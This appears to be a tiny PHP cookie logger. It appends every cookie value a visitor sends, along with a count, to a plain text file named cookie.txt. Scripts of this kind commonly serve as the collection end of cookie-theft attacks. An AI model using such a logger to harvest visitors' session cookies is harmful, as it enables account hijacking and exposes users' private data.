<?php
$cookie = $_COOKIE;
$file = fopen('cookie.txt', 'a');
fwrite($file, COUNT($cookie) . "\n\n");
fwrite($file, implode("|",$cookie) . "\n\n");
?>